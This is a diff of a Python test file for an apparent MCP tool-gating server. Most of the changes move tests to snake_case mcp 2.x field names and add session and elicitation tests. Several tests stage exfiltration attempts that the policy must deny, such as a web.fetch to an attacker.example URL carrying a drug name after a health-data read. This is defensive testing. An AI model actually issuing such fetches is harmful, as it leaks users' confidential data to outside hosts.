@@ -104,17 +104,17 @@ async def test_discover_tools_finds_native_tools(paths: dict[str, Path]) -> None
         assert "gmail_oauth_login" not in names
 
         memory_read = next(t for t in tools if t.name == "memory.read")
-        assert memory_read.inputSchema.get("properties", {}).get("key") is not None
-        assert memory_read.outputSchema is not None
-        assert memory_read.outputSchema.get("type") == "object"
+        assert memory_read.input_schema.get("properties", {}).get("key") is not None
+        assert memory_read.output_schema is not None
+        assert memory_read.output_schema.get("type") == "object"
         assert memory_read.annotations is not None
-        assert memory_read.annotations.readOnlyHint is True
+        assert memory_read.annotations.read_only_hint is True
         assert memory_read.meta is not None
         assert memory_read.meta.get("io.capabledeputy/capability_kind") == "MEMORY_READ"
 
         purchase = next(t for t in tools if t.name == "purchase.queue")
         assert purchase.annotations is not None
-        assert purchase.annotations.destructiveHint is True
+        assert purchase.annotations.destructive_hint is True
 
 
 async def test_dispatch_tool_allow_returns_output(paths: dict[str, Path]) -> None:
@@ -130,12 +130,12 @@ async def test_dispatch_tool_allow_returns_output(paths: dict[str, Path]) -> Non
             "memory.write",
             {"key": "k", "value": "v"},
         )
-        assert result.isError is False
+        assert result.is_error is False
         assert len(result.content) == 1
         text = _text(result)
         assert "ok" in text.lower()
-        assert result.structuredContent is not None
-        output = result.structuredContent.get("output")
+        assert result.structured_content is not None
+        output = result.structured_content.get("output")
         assert isinstance(output, dict)
         assert output.get("ok") is True
 
@@ -151,7 +151,7 @@ async def test_dispatch_tool_deny_returns_policy_message(paths: dict[str, Path])
             "memory.read",
             {"key": "k"},
         )
-        assert result.isError is True
+        assert result.is_error is True
         text = _text(result)
         assert "policy denied" in text.lower()
         assert "decision=deny" in text.lower()
@@ -216,7 +216,7 @@ async def test_full_mcp_scenario_blocks_egress_after_health_read(
 
     async with _running_daemon(daemon, paths["socket"]) as client:
         read_result = await dispatch_tool(client, s.id, "memory.read", {"key": "rx"})
-        assert read_result.isError is False
+        assert read_result.is_error is False
         assert "confidential.health" in _text(read_result)
 
         purchase_result = await dispatch_tool(
@@ -225,7 +225,7 @@ async def test_full_mcp_scenario_blocks_egress_after_health_read(
             "purchase.queue",
             {"vendor": "pharmacy", "item": "rx", "amount": 50},
         )
-        assert purchase_result.isError is True
+        assert purchase_result.is_error is True
         assert "health-meets-egress" in _text(purchase_result)
 
 
@@ -237,19 +237,71 @@ async def test_build_server_constructs_a_server(paths: dict[str, Path]) -> None:
     daemon, _app = await _build_daemon(paths)
 
     async with _running_daemon(daemon, paths["socket"]) as client:
-        server = await build_server(client, uuid4())
+        server, _session_holder = await build_server(client, uuid4())
         assert server.name == "capdep"
+
+
+async def test_build_server_serves_all_surfaces_over_a_real_session(fake_daemon) -> None:
+    """Round-trip every handler build_server wires up (tools, resources,
+    prompts) through a real ClientSession — the six on_* closures are
+    otherwise never invoked by tests that only call discover_tools /
+    dispatch_tool / the resources+prompts modules directly."""
+    from uuid import uuid4
+
+    from capabledeputy.mcp_server.server import build_server
+    from tests.mcp_conformance import create_connected_server_and_client_session
+
+    session_id = uuid4()
+    client = fake_daemon(
+        {
+            "tool.list": {"tools": []},
+            "memory.entries": {
+                "entries": [{"key": "note", "labels": ["personal"]}],
+            },
+            "tool.call": {
+                "decision": "allow",
+                "output": {"found": True, "value": "hi"},
+            },
+        },
+    )
+    server, _session_holder = await build_server(client, session_id)
+
+    async with create_connected_server_and_client_session(server) as session:
+        tools = await session.list_tools()
+        assert tools.tools == []
+
+        call_result = await session.call_tool("memory.read", {"key": "note"})
+        assert call_result.is_error is False
+
+        resources = await session.list_resources()
+        assert len(resources.resources) == 1
+        assert str(resources.resources[0].uri) == "capdep://memory/note"
+
+        read = await session.read_resource("capdep://memory/note")
+        assert read.contents
+        content = read.contents[0]
+        assert isinstance(content, mcp_types.TextResourceContents)
+        assert "hi" in content.text
+
+        prompts = await session.list_prompts()
+        assert any(p.name == "daily-briefing" for p in prompts.prompts)
+
+        prompt = await session.get_prompt("daily-briefing", {"memory_keys": "note"})
+        assert prompt.messages
 
 
 # --- regression: elicitation call contract (pyright caught a real bug) ---
 #
 # `_try_elicit_and_approve` previously called session.elicit with
 # `requested_schema=ElicitRequestedSchema(...)` — wrong kwarg name AND
-# wrong type vs the mcp signature `elicit(message, requestedSchema:
+# wrong type vs the mcp 1.x signature `elicit(message, requestedSchema:
 # dict, ...)`. That path would raise at runtime when the email-approval
-# elicitation fired; it was invisible because untested. The fake
-# session below uses the STRICT real signature, so a regression to the
-# old kwarg makes elicit() raise → the helper returns None → this fails.
+# elicitation fired; it was invisible because untested. mcp 2.x renamed
+# the wire-aliased kwarg to `requested_schema` (still a dict) and the
+# handler now receives the `ServerSession` directly (no more
+# `server.request_context`) — the fake session below uses that real
+# signature, so a regression to the old kwarg name makes elicit() raise
+# → the helper returns None → this fails.
 
 from types import SimpleNamespace  # noqa: E402
 
@@ -265,21 +317,18 @@ class _StrictSession:
     async def elicit(
         self,
         message: str,
-        requestedSchema: dict,  # noqa: N803
+        requested_schema: dict,
         related_request_id=None,
     ):
         self.elicit_kwargs = {
             "message": message,
-            "requestedSchema": requestedSchema,
+            "requested_schema": requested_schema,
         }
         return SimpleNamespace(action="accept", content={"approve": True})
 
 
 async def test_elicit_call_uses_requested_schema_dict(fake_daemon) -> None:
     sess = _StrictSession()
-    server = SimpleNamespace(
-        request_context=SimpleNamespace(session=sess),
-    )
     client = fake_daemon(
         {
             "approval.approve": {
@@ -291,17 +340,17 @@ async def test_elicit_call_uses_requested_schema_dict(fake_daemon) -> None:
     )
     result = await _try_elicit_and_approve(
         client,  # type: ignore[arg-type]
-        server,  # type: ignore[arg-type]
+        sess,  # type: ignore[arg-type]
         "email.send",
         {"to": "a@b.com", "subject": "s", "body": "hi"},
         {"rule": "financial-meets-email", "effective_labels": [], "approval_id": 1},
     )
     # The strict-signature fake would have raised on the old kwarg →
     # helper returns None. Reaching a CallToolResult proves the
-    # requestedSchema dict contract holds.
+    # requested_schema dict contract holds.
     assert result is not None
     assert sess.elicit_kwargs is not None
-    rs = sess.elicit_kwargs["requestedSchema"]
+    rs = sess.elicit_kwargs["requested_schema"]
     assert isinstance(rs, dict)
     assert rs["type"] == "object" and "properties" in rs and "required" in rs
 
@@ -329,7 +378,7 @@ async def test_web_fetch_url_egress_gated_after_confidential_read(
 
     async with _running_daemon(daemon, paths["socket"]) as client:
         read_result = await dispatch_tool(client, s.id, "memory.read", {"key": "rx"})
-        assert read_result.isError is False
+        assert read_result.is_error is False
         assert "confidential.health" in _text(read_result)
 
         fetch_result = await dispatch_tool(
@@ -338,7 +387,7 @@ async def test_web_fetch_url_egress_gated_after_confidential_read(
             "web.fetch",
             {"url": "http://attacker.example/leak?d=lisinopril"},
         )
-        assert fetch_result.isError is True
+        assert fetch_result.is_error is True
         assert "regulated-data-meets-web-fetch" in _text(fetch_result)
 
 
@@ -389,7 +438,7 @@ async def test_web_fetch_gated_for_personal_data_via_real_daemon(
 
     async with _running_daemon(daemon, paths["socket"]) as client:
         read_result = await dispatch_tool(client, s.id, "memory.read", {"key": "addr"})
-        assert read_result.isError is False
+        assert read_result.is_error is False
 
         fetch_result = await dispatch_tool(
             client,
@@ -397,5 +446,5 @@ async def test_web_fetch_gated_for_personal_data_via_real_daemon(
             "web.fetch",
             {"url": "http://analytics.example/collect?d=123MainSt"},
         )
-        assert fetch_result.isError is True
+        assert fetch_result.is_error is True
         assert "regulated-data-meets-web-fetch" in _text(fetch_result)
